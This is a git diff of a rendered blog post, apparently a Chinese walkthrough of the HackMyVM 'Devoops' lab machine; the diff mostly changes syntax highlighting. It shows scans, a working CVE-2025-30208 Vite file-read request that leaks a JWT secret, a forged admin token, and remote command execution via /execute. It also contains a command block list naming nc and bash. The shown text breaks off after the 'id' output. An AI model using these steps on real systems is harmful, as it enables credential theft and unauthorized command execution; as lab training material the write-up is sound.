@@ -595,7 +595,7 @@ app.listen(port, address, () => {
 <meta property="og:url" content="https://pingsag3.github.io/post/hackmyvm%20Devoops-ce-shi-ji-lu.html">
 <meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
 <title>hackmyvm Devoops测试记录</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -662,85 +662,82 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>hackmyvm_Devoops</h1>
-<pre lang="shell" class="notranslate"><code class="notranslate">大佬WP：
+<div class="highlight highlight-source-shell"><pre class="notranslate">大佬WP：
 https://www.bilibili.com/video/BV1HhLozpEk5
 https://pepster.me/Temp-DevOops-Walkthrough/
-2020：DevOops 设计思路.pdf
-</code></pre>
+2020：DevOops 设计思路.pdf</pre></div>
 <h3>1. 基本信息</h3>
 <pre class="notranslate"><code class="notranslate">靶机链接：
 https://maze-sec.com/library
 https://hackmyvm.eu/machines/machine.php?vm=Devoops
 </code></pre>
-<pre lang="shell" class="notranslate"><code class="notranslate">难度：⭐️⭐️⭐️
-知识点：信息收集，`jwt`使用，`Vite[CVE-2025-30208]`任意文件读取，`gitea`服务，`git log`看日志，`socat`端口转发，私钥，`arp`提权
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️⭐️⭐️
+知识点：信息收集，<span class="pl-s"><span class="pl-pds">`</span>jwt<span class="pl-pds">`</span></span>使用，<span class="pl-s"><span class="pl-pds">`</span>Vite[CVE-2025-30208]<span class="pl-pds">`</span></span>任意文件读取，<span class="pl-s"><span class="pl-pds">`</span>gitea<span class="pl-pds">`</span></span>服务，<span class="pl-s"><span class="pl-pds">`</span>git log<span class="pl-pds">`</span></span>看日志，<span class="pl-s"><span class="pl-pds">`</span>socat<span class="pl-pds">`</span></span>端口转发，私钥，<span class="pl-s"><span class="pl-pds">`</span>arp<span class="pl-pds">`</span></span>提权</pre></div>
 <h3>2. 信息收集</h3>
 <h3>Nmap</h3>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# arp-scan -l | grep PCS
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
 192.168.31.25   08:00:27:b3:d9:97       PCS Systemtechnik GmbH
-└─# IP=192.168.31.25
-└─# nmap -sV -sC -A $IP -Pn
+└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.31.25</span>
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-29 22:16 CST
-Nmap scan report for devoops (192.168.31.25)
+Nmap scan report <span class="pl-k">for</span> devoops (192.168.31.25)
 Host is up (0.0014s latency).
 Not shown: 999 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
-3000/tcp open  ppp?
-| fingerprint-strings:
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, NCP, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
-|     HTTP/1.1 400 Bad Request
-|   FourOhFourRequest, GetRequest:
-|     HTTP/1.1 403 Forbidden
-|     Vary: Origin
-|     Content-Type: text/plain
-|     Date: Thu, 29 May 2025 14:16:15 GMT
-|     Connection: close
-|     Blocked request. This host (undefined) is not allowed.
-|     allow this host, add undefined to `server.allowedHosts` in vite.config.js.
-|   HTTPOptions, RTSPRequest:
-|     HTTP/1.1 204 No Content
-|     Vary: Origin, Access-Control-Request-Headers
-|     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
-|     Content-Length: 0
-|     Date: Thu, 29 May 2025 14:16:15 GMT
-|_    Connection: close
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+3000/tcp open  ppp<span class="pl-k">?</span>
+<span class="pl-k">|</span> fingerprint-strings:
+<span class="pl-k">|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, NCP, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
+<span class="pl-k">|</span>     HTTP/1.1 400 Bad Request
+<span class="pl-k">|</span>   FourOhFourRequest, GetRequest:
+<span class="pl-k">|</span>     HTTP/1.1 403 Forbidden
+<span class="pl-k">|</span>     Vary: Origin
+<span class="pl-k">|</span>     Content-Type: text/plain
+<span class="pl-k">|</span>     Date: Thu, 29 May 2025 14:16:15 GMT
+<span class="pl-k">|</span>     Connection: close
+<span class="pl-k">|</span>     Blocked request. This host (undefined) is not allowed.
+<span class="pl-k">|</span>     allow this host, add undefined to <span class="pl-s"><span class="pl-pds">`</span>server.allowedHosts<span class="pl-pds">`</span></span> <span class="pl-k">in</span> vite.config.js.
+<span class="pl-k">|</span>   HTTPOptions, RTSPRequest:
+<span class="pl-k">|</span>     HTTP/1.1 204 No Content
+<span class="pl-k">|</span>     Vary: Origin, Access-Control-Request-Headers
+<span class="pl-k">|</span>     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
+<span class="pl-k">|</span>     Content-Length: 0
+<span class="pl-k">|</span>     Date: Thu, 29 May 2025 14:16:15 GMT
+<span class="pl-k">|</span>_    Connection: close
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi<span class="pl-k">?</span>new-service <span class="pl-c1">:</span>
 SF-Port3000-TCP:V=7.95%I=7%D=5/29%Time=68386C31%P=x86_64-pc-linux-gnu%r(Ge
-SF:tRequest,FE,"HTTP/1\.1\x20403\x20Forbidden\r\nVary:\x20Origin\r\nConten
-SF:t-Type:\x20text/plain\r\nDate:\x20Thu,\x2029\x20May\x202025\x2014:16:15
-SF:\x20GMT\r\nConnection:\x20close\r\n\r\nBlocked\x20request\.\x20This\x20
-SF:host\x20\(undefined\)\x20is\x20not\x20allowed\.\nTo\x20allow\x20this\x2
-SF:0host,\x20add\x20undefined\x20to\x20`server\.allowedHosts`\x20in\x20vit
-SF:e\.config\.js\.")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n
-SF:")%r(NCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(HTTPOptions
-SF:,D2,"HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Access-Co
-SF:ntrol-Request-Headers\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,PUT,
-SF:PATCH,POST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2029\x20May
-SF:\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReq
-SF:uest,D2,"HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Acces
-SF:s-Control-Request-Headers\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,
-SF:PUT,PATCH,POST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2029\x2
-SF:0May\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RPC
-SF:Check,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(DNSVersionBind
-SF:ReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(DNSStatusRequ
-SF:estTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLSessionReq
-SF:,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServerCooki
-SF:e,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSessionReq,1C,"
-SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HTTP/1\.1\x
-SF:20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x20400\x20
-SF:Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Bad\x20Requ
-SF:est\r\n\r\n")%r(FourOhFourRequest,FE,"HTTP/1\.1\x20403\x20Forbidden\r\n
-SF:Vary:\x20Origin\r\nContent-Type:\x20text/plain\r\nDate:\x20Thu,\x2029\x
-SF:20May\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\nBlocked
-SF:\x20request\.\x20This\x20host\x20\(undefined\)\x20is\x20not\x20allowed\
-SF:.\nTo\x20allow\x20this\x20host,\x20add\x20undefined\x20to\x20`server\.a
-SF:llowedHosts`\x20in\x20vite\.config\.js\.");
-MAC Address: 08:00:27:B3:D9:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-</code></pre>
+SF:tRequest,FE,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20403\x20Forbidden\r\nVary:\x20Origin\r\nConten</span>
+<span class="pl-s">SF:t-Type:\x20text/plain\r\nDate:\x20Thu,\x2029\x20May\x202025\x2014:16:15</span>
+<span class="pl-s">SF:\x20GMT\r\nConnection:\x20close\r\n\r\nBlocked\x20request\.\x20This\x20</span>
+<span class="pl-s">SF:host\x20\(undefined\)\x20is\x20not\x20allowed\.\nTo\x20allow\x20this\x2</span>
+<span class="pl-s">SF:0host,\x20add\x20undefined\x20to\x20<span class="pl-s"><span class="pl-pds">`</span>server<span class="pl-cce">\.</span>allowedHosts<span class="pl-pds">`</span></span>\x20in\x20vit</span>
+<span class="pl-s">SF:e\.config\.js\.<span class="pl-pds">"</span></span>)%r(Help,1C,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n</span>
+<span class="pl-s">SF:<span class="pl-pds">"</span></span>)%r(NCP,1C,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<span class="pl-pds">"</span></span>)%r(HTTPOptions
+SF:,D2,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Access-Co</span>
+<span class="pl-s">SF:ntrol-Request-Headers\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,PUT,</span>
+<span class="pl-s">SF:PATCH,POST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2029\x20May</span>
+<span class="pl-s">SF:\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\n<span class="pl-pds">"</span></span>)%r(RTSPReq
+SF:uest,D2,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20204\x20No\x20Content\r\nVary:\x20Origin,\x20Acces</span>
+<span class="pl-s">SF:s-Control-Request-Headers\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,</span>
+<span class="pl-s">SF:PUT,PATCH,POST,DELETE\r\nContent-Length:\x200\r\nDate:\x20Thu,\x2029\x2</span>
+<span class="pl-s">SF:0May\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\n<span class="pl-pds">"</span></span>)%r(RPC
+SF:Check,1C,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<span class="pl-pds">"</span></span>)%r(DNSVersionBind
+SF:ReqTCP,1C,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<span class="pl-pds">"</span></span>)%r(DNSStatusRequ
+SF:estTCP,1C,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<span class="pl-pds">"</span></span>)%r(SSLSessionReq
+SF:,1C,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<span class="pl-pds">"</span></span>)%r(TerminalServerCooki
+SF:e,1C,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<span class="pl-pds">"</span></span>)%r(TLSSessionReq,1C,<span class="pl-s"><span class="pl-pds">"</span></span>
+<span class="pl-s">SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n<span class="pl-pds">"</span></span>)%r(Kerberos,1C,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x</span>
+<span class="pl-s">SF:20400\x20Bad\x20Request\r\n\r\n<span class="pl-pds">"</span></span>)%r(SMBProgNeg,1C,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20400\x20</span>
+<span class="pl-s">SF:Bad\x20Request\r\n\r\n<span class="pl-pds">"</span></span>)%r(X11Probe,1C,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20400\x20Bad\x20Requ</span>
+<span class="pl-s">SF:est\r\n\r\n<span class="pl-pds">"</span></span>)%r(FourOhFourRequest,FE,<span class="pl-s"><span class="pl-pds">"</span>HTTP/1\.1\x20403\x20Forbidden\r\n</span>
+<span class="pl-s">SF:Vary:\x20Origin\r\nContent-Type:\x20text/plain\r\nDate:\x20Thu,\x2029\x</span>
+<span class="pl-s">SF:20May\x202025\x2014:16:15\x20GMT\r\nConnection:\x20close\r\n\r\nBlocked</span>
+<span class="pl-s">SF:\x20request\.\x20This\x20host\x20\(undefined\)\x20is\x20not\x20allowed<span class="pl-cce">\</span></span>
+<span class="pl-s">SF:.\nTo\x20allow\x20this\x20host,\x20add\x20undefined\x20to\x20<span class="pl-s"><span class="pl-pds">`</span>server<span class="pl-cce">\.</span>a</span></span>
+<span class="pl-s"><span class="pl-s">SF:llowedHosts<span class="pl-pds">`</span></span>\x20in\x20vite\.config\.js\.<span class="pl-pds">"</span></span>)<span class="pl-k">;</span>
+MAC Address: 08:00:27:B3:D9:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</pre></div>
 <p>只开放了<code class="notranslate">3000</code>口，尝试访问一下，一个示例页面，讲述如何创建一个<code class="notranslate">Vue.js + Express.js</code>的前后端分离项目,<code class="notranslate">vue.js</code>的新手指南</p>
 <h3>目录扫描</h3>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# dirsearch -u http://$IP:3000  -x 403 -e txt,php,html
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP:3000  -x 403 -e txt,php,html</span>
 [22:16:55] 200 -  302B  - /.flac
 [22:16:55] 200 -  301B  - /.gif
 [22:16:55] 200 -  301B  - /.ico
@@ -754,13 +751,12 @@ MAC Address: 08:00:27:B3:D9:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 [22:17:13] 200 -  385B  - /README.md
 [22:17:14] 200 -   21KB - /server
 [22:17:14] 200 -   21KB - /server.js
-└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP:3000 -x.txt,.php,.html --exclude-length 414
+└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP:3000 -x.txt,.php,.html --exclude-length 414</span>
 /.txt                 (Status: 200) [Size: 301]
 /server               (Status: 200) [Size: 21764]
 /sign                 (Status: 200) [Size: 189]
 /execute              (Status: 401) [Size: 48]
-/.txt                 (Status: 200) [Size: 301]
-</code></pre>
+/.txt                 (Status: 200) [Size: 301]</pre></div>
 <p><code class="notranslate">gobuster</code>可以发现几个有用的路径<code class="notranslate">/execute、/sign、/server.js</code>挨个请求一下看看</p>
 <pre class="notranslate"><code class="notranslate">└─# curl http://$IP:3000/sign
 {"status":"signed","data":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg1Mjg3NjIsImV4cCI6MTc0ODUzMDU2Mn0.F8hwKtxcpYq9Hgm0w-AoiZQT1sqb69kwMTN4l_768z0"}
@@ -903,17 +899,16 @@ app.listen(port, address, () =&gt; {
 <p>访问<code class="notranslate">/sign</code>返回了一串<code class="notranslate"> jwt</code>，访问<code class="notranslate">/execute</code>提示<code class="notranslate"> permission denied</code>， 访问<code class="notranslate">/server.js</code>返回了 <code class="notranslate">Express.js </code>后端的源码</p>
 <h5><code class="notranslate"> jwt</code></h5>
 <p>看了大佬<code class="notranslate">WP</code>说不难猜出是要修改<code class="notranslate"> jwt</code> 获得权限，再访问 <code class="notranslate">/execute </code>执行命令</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#https://jwt.io/
-{"status":"signed","data":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg1Mjg3NjIsImV4cCI6MTc0ODUzMDU2Mn0.F8hwKtxcpYq9Hgm0w-AoiZQT1sqb69kwMTN4l_768z0"}
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>https://jwt.io/</span>
+{<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>signed<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>data<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg1Mjg3NjIsImV4cCI6MTc0ODUzMDU2Mn0.F8hwKtxcpYq9Hgm0w-AoiZQT1sqb69kwMTN4l_768z0<span class="pl-pds">"</span></span>}
 
 ---
 {
-  "uid": -1,
-  "role": "guest",
-  "iat": 1748528762,
-  "exp": 1748530562
-}
-</code></pre>
+  <span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>: -1,
+  <span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>guest<span class="pl-pds">"</span></span>,
+  <span class="pl-s"><span class="pl-pds">"</span>iat<span class="pl-pds">"</span></span>: 1748528762,
+  <span class="pl-s"><span class="pl-pds">"</span>exp<span class="pl-pds">"</span></span>: 1748530562
+}</pre></div>
 <p>先找个[<a href="https://www.bejson.com/jwt/" rel="nofollow">网页</a>](<a href="https://www.bejson.com/jwt/)%E8%A7%A3%E7%A0%81%60jwt%60,%E6%98%BE%E7%A4%BA%E8%A7%92%E8%89%B2%E6%98%AF%60" rel="nofollow">https://www.bejson.com/jwt/)解码`jwt`,显示角色是`</a> guest`</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529224940177.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529224940177.png" alt="image-20250529224940177" style="max-width: 100%;"></a></p>
 <p>需要将这里的<code class="notranslate"> guest</code> 改为 <code class="notranslate">admin</code> 之类，但是目前并没有<code class="notranslate"> secret</code>审计<code class="notranslate"> server.js</code> 的源码</p>
@@ -927,8 +922,7 @@ app.listen(port, address, () =&gt; {
 初始化项目时标注了<code class="notranslate">Vite</code>的版本</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225656145.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225656145.png" alt="image-20250529225656145" style="max-width: 100%;"></a></p>
 <p>底部标注了页面修改的时间</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">@20206675 - Last modified 2025-02-26
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">@20206675 - Last modified 2025-02-26</pre></div>
 <h3>POC：Vite[<a title="CVE-2025-30208" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-x574-m823-4x7w/hovercard" href="https://github.com/advisories/GHSA-x574-m823-4x7w">CVE-2025-30208</a>]</h3>
 <p>根据 <code class="notranslate">Vite</code> 的 <code class="notranslate">release note</code>，这个日期距离 <code class="notranslate">6.2.0 </code>版本最近</p>
 <p>搜索<code class="notranslate"> Vite 6.2.0</code>，也可以找到 <code class="notranslate">CVE-2025-30208</code>任意文件读取漏洞</p>
@@ -936,68 +930,60 @@ app.listen(port, address, () =&gt; {
 <p>其实也不用<code class="notranslate">python</code>脚本，直接<code class="notranslate">curl</code>就行了</p>
 <p>具体利用就是在url的文件路径后添加<code class="notranslate">?raw??</code>或者<code class="notranslate">?import&amp;raw??</code>实现绕过</p>
 <p>尝试读取<code class="notranslate">.env</code>中的<code class="notranslate">JWT_SECRE</code>变量</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl "http://$IP:3000/@fs/opt/node/.env?raw??"
-export default "JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&amp;,&lt;,&gt;,ls,cat,pwd,head,tail,grep,xxd'\n"
-//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi5lbnY/cmF3PyJdLCJzb3VyY2VzQ29udGVudCI6WyJleHBvcnQgZGVmYXVsdCBcIkpXVF9TRUNSRVQ9JzI5NDJzektHN0V2ODNhRHZpdWdBYTZyRnBLaXhaelp6J1xcbkNPTU1BTkRfRklMVEVSPSduYyxweXRob24scHl0aG9uMyxweSxweTMsYmFzaCxzaCxhc2gsfCwmLDwsPixscyxjYXQscHdkLGhlYWQsdGFpbCxncmVwLHh4ZCdcXG5cIiJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQSxNQUFNLENBQUMsT0FBTyxDQUFDLENBQUMsVUFBVSxDQUFDLENBQUMsZ0NBQWdDLENBQUMsQ0FBQyxlQUFlLENBQUMsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLE9BQU8sQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDIn0=
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl "http://$IP:3000/@fs/opt/node/.env?raw??"</span>
+<span class="pl-k">export</span> default <span class="pl-s"><span class="pl-pds">"</span>JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&amp;,&lt;,&gt;,ls,cat,pwd,head,tail,grep,xxd'\n<span class="pl-pds">"</span></span>
+//<span class="pl-c"><span class="pl-c">#</span> sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi5lbnY/cmF3PyJdLCJzb3VyY2VzQ29udGVudCI6WyJleHBvcnQgZGVmYXVsdCBcIkpXVF9TRUNSRVQ9JzI5NDJzektHN0V2ODNhRHZpdWdBYTZyRnBLaXhaelp6J1xcbkNPTU1BTkRfRklMVEVSPSduYyxweXRob24scHl0aG9uMyxweSxweTMsYmFzaCxzaCxhc2gsfCwmLDwsPixscyxjYXQscHdkLGhlYWQsdGFpbCxncmVwLHh4ZCdcXG5cIiJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQSxNQUFNLENBQUMsT0FBTyxDQUFDLENBQUMsVUFBVSxDQUFDLENBQUMsZ0NBQWdDLENBQUMsQ0FBQyxlQUFlLENBQUMsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLE9BQU8sQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDIn0=</span></pre></div>
 <p>获得<code class="notranslate">JWT_SECRE='2942szKG7Ev83aDviugAa6rFpKixZzZz'</code>，同时还有 <code class="notranslate">COMMAND_FILTER</code>，是对 <code class="notranslate">/execute </code>命令执行的过滤</p>
 <h3>获得<code class="notranslate">runner</code>权限</h3>
 <p>先使用 <code class="notranslate">secret</code> 生成新的 <code class="notranslate">jwt</code></p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529231800529.png"><img src="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529231800529.png" alt="image-20250529231800529" style="max-width: 100%;"></a></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#注意# `curl http://$IP:3000/sign`拿的`jwt`存在有效期，过期了需重新请求
-#载荷/Payload
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>注意# `curl http://$IP:3000/sign`拿的`jwt`存在有效期，过期了需重新请求</span>
+<span class="pl-c"><span class="pl-c">#</span>载荷/Payload</span>
 {
-    "uid": -1,
-    "role": "admin",
-    "iat": 1748533467,
-    "exp": 1748535267
+    <span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>: -1,
+    <span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>admin<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>iat<span class="pl-pds">"</span></span>: 1748533467,
+    <span class="pl-s"><span class="pl-pds">"</span>exp<span class="pl-pds">"</span></span>: 1748535267
 }
-JWT_SECRE='2942szKG7Ev83aDviugAa6rFpKixZzZz'
+JWT_SECRE=<span class="pl-s"><span class="pl-pds">'</span>2942szKG7Ev83aDviugAa6rFpKixZzZz<span class="pl-pds">'</span></span>
 ---
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984
-#也可以用厨子，菜谱如下
-#recipe=JWT_Sign('2942szKG7Ev83aDviugAa6rFpKixZzZz','HS256')
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span>也可以用厨子，菜谱如下</span>
+<span class="pl-c"><span class="pl-c">#</span>recipe=JWT_Sign('2942szKG7Ev83aDviugAa6rFpKixZzZz','HS256')</span></pre></div>
 <p>带上 <code class="notranslate">Authorization </code>头访问，返回值发生变化</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984' "http://$IP:3000/execute/"
-{"status":"rejected","data":"this command is unsafe"}
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984' "http://$IP:3000/execute/"</span>
+{<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>rejected<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>data<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>this command is unsafe<span class="pl-pds">"</span></span>}</pre></div>
 <p>在<code class="notranslate">server.js</code>中可以发现，命令来自 <code class="notranslate">req.query.cmd</code>，在请求中加上参数<code class="notranslate"> cmd</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984' "http://$IP:3000/execute/?cmd=id"
-{"status":"executed","data":{"stdout":"uid=1000(runner) gid=1000(runner) groups=1000(runner)\n","stderr":""}}
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl -s -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDg1MzM0NjcsImV4cCI6MTc0ODUzNTI2N30.VBQ8TkwXkfVv8M9NO-vNr5glCBVdCfRAXrj0wj_t984' "http://$IP:3000/execute/?cmd=id"</span>
